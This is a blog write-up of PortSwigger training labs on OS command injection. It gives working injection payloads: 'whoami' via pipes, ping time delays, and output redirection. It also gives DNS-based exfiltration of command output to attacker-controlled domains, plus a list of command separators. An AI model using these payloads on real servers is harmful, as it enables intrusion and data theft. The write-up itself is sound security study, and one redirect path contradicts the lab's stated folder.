---
title: OS Command Injection - Portswigger Labs
description: OS Command Injection - Portswigger Labs
excerpt:
  Command Injection, allows an attacker to execute operating system (OS) commands on the server that is running an application and typically fully compromise the application and its data.
datetime: 2024-05-09T19:33:07.000+00:00
tags:
  - Command Injection
  - Portswigger
  - Labs
featured: false
category: Tutorial
author: nGbonzini
type: article
coverImage:  https://miro.medium.com/v2/resize:fit:640/format:webp/1*HapzmTCjNvXIff_AsOCIuw.png
coverImageAlt: Microsoft AD
coverImageWidth: "2725"
coverImageHeight: "1400"
ogImage: "/assets/blog/hello-world/cover.jpg"
ogImageAlt: something
language: "English"
---
----

As preparation for the eWPTX im going to work through the Portswigger labs. In this post im going to steal... take notes about OS command injection and resolve the labs. Let's get started!!!

## Whats is OS Command Injection ?
OS command injection, allows an attacker to execute operating system (OS) commands on the server that is running an application, and typically fully compromise the application and its data.

## Lab 1 - OS Command Injection, simple case

>This lab contains an OS command injection vulnerability in the product stock checker. The application executes a shell command containing user-supplied product and store IDs, and returns the raw output from the command in its response.
To solve the lab, execute the whoami command to determine the name of the current user. 

We go to the page and click in the "View Details" button.
![](https://raw.githubusercontent.com/NicolasGula/NicolasGula/master/public/images/photos/lab1/1.png)

When we do click in "Check Stock",send a request with parameters `productId=1&storeId=2` to `/product/stock`
![](https://raw.githubusercontent.com/NicolasGula/NicolasGula/master/public/images/photos/lab1/2.png)
![](https://raw.githubusercontent.com/NicolasGula/NicolasGula/master/public/images/photos/lab1/3.png)

We change `storeId=2` for ...
```bash
productId=1&storeId=| whoami
```

and give us the name.
![](https://raw.githubusercontent.com/NicolasGula/NicolasGula/master/public/images/photos/lab1/4.png)

## Blind OS command injection vulnerabilities
### Detecting blind OS command injection using time delays
You can use an injected command to trigger a time delay, enabling you to confirm that the command was executed based on the time that the application takes to respond. The ping command is a good way to do this, because lets you specify the number of ICMP packets to send.

```
& ping -c 10 127.0.0.1 &
```

## Lab 2 - Blind OS command injection with time delays
>This lab contains a blind OS command injection vulnerability in the feedback function. The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response. To solve the lab, exploit the blind OS command injection vulnerability to cause a 10 second delay. 

We go to the Submit feedback page
![](https://raw.githubusercontent.com/NicolasGula/NicolasGula/master/public/images/photos/lab2/1.png)

In the form put any data, send and capture with Burpsuite.
![](https://raw.githubusercontent.com/NicolasGula/NicolasGula/master/public/images/photos/lab2/2.png)
![](https://raw.githubusercontent.com/NicolasGula/NicolasGula/master/public/images/photos/lab2/3.png)

After testing in all parameters with the payload ...
```
| ping -c 10 127.0.0.1 &
```
URL encoded ...
```
|+ping+-c+10+127.0.0.1+%26
```

![](https://raw.githubusercontent.com/NicolasGula/NicolasGula/master/public/images/photos/lab2/4.png)

We see a delay of 9,440 milliseconds 🥳
![](https://raw.githubusercontent.com/NicolasGula/NicolasGula/master/public/images/photos/lab2/5.png)

## Exploiting blind OS command injection by redirecting output
You can redirect the output from the injected command into a file. The > character sends the output from the whoami command to the specified file. For example:

```
& whoami > /var/www/static/whoami.txt &
```

## Lab 3 - Blind OS command injection with output redirection

> This lab contains a blind OS command injection vulnerability in the feedback function. The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response. However, you can use output redirection to capture the output from the command. There is a writable folder at: `/var/www/images/` The application serves the images for the product catalog from this location. You can redirect the output from the injected command to a file in this folder, and then use the image loading URL to retrieve the contents of the file. To solve the lab, execute the whoami command and retrieve the output. 

Same procedure like the lab before: go to the page of Submit Feedback,fill the form, send it, capture the request.
![](https://raw.githubusercontent.com/NicolasGula/NicolasGula/master/public/images/photos/lab3/1.png)

We search for the parameter where inject the command
```
| whoami > /var/images/www/quiensoy.txt &
```
![](https://raw.githubusercontent.com/NicolasGula/NicolasGula/master/public/images/photos/lab3/2.png)
![](https://raw.githubusercontent.com/NicolasGula/NicolasGula/master/public/images/photos/lab3/3.png)

## Exploiting Blind OS Command Injection Using out-of-band (OAST) techniques

You can use an injected command that will trigger an out-of-band network interaction with a system that you control, using OAST techniques.
```
& nslookup kgji2ohoyw.web-attacker.com &
```

## Lab 4 - Blind OS Command Injection with out-of-band Interaction

> This lab contains a blind OS command injection vulnerability in the feedback function.The application executes a shell command containing the user-supplied details. The command is executed asynchronously and has no effect on the application's response. It is not possible to redirect output into a location that you can access. However, you can trigger out-of-band interactions with an external domain.To solve the lab, exploit the blind OS command injection vulnerability to issue a DNS lookup to Burp Collaborator. 

Same procedure 😮‍💨.....Copy the url from BurpCollaborator (Buy it! 😉)

```
| nslookup 2be44phd8284tgglwr1sf7ytekkb81wq.oastify.com &
```
![](https://raw.githubusercontent.com/NicolasGula/NicolasGula/master/public/images/photos/lab4/1.png)
And uala!
![](https://raw.githubusercontent.com/NicolasGula/NicolasGula/master/public/images/photos/lab4/2.png)

## Next 

The out-of-band channel provides an easy way to exfiltrate the output from injected commands
```
& nslookup `whoami`.kgji2ohoyw.web-attacker.com &
```

This causes a DNS lookup to the attacker's domain containing the result of the whoami command
```
wwwuser.kgji2ohoyw.web-attacker.com
```

## Lab 5 - Blind OS Command Injection with out-of-band data exfiltration

> This lab contains a blind OS command injection vulnerability in the feedback function. The application executes a shell command containing the user-supplied details. The command is executed asynchronously and has no effect on the application's response. It is not possible to redirect output into a location that you can access. However, you can trigger out-of-band interactions with an external domain. To solve the lab, execute the whoami command and exfiltrate the output via a DNS query to Burp Collaborator. You will need to enter the name of the current user to complete the lab. 

🏃‍♀️Go to the page of Submit Feedback,🏃‍♀️ fill the form, 🏃‍♀️ send it, 🏃‍♀️capture the request, copy the link from Burp Collaborator (B - U -Y -- I - T - ! 😉⬇️)

```
| nslookup 'whoami' .blablablablabla.whatever.com &
```
![](https://raw.githubusercontent.com/NicolasGula/NicolasGula/master/public/images/photos/lab5/1.png)
![](https://raw.githubusercontent.com/NicolasGula/NicolasGula/master/public/images/photos/lab5/2.png)
![](https://raw.githubusercontent.com/NicolasGula/NicolasGula/master/public/images/photos/lab5/3.png)

## Ways of injecting OS Commands

The following command separators work on both Windows and Unix-based systems
```
&
&&
|
||
```

Unix
```
;
0x0a
\n
```

I hope you find it useful.👨‍💻

## Resources

[Portswigger](https://portswigger.net/web-security/os-command-injection)  

[HackTheBox](https://academy.hackthebox.com/module/details/109)  

[INE](https://ine.com/blog/command-injection)  

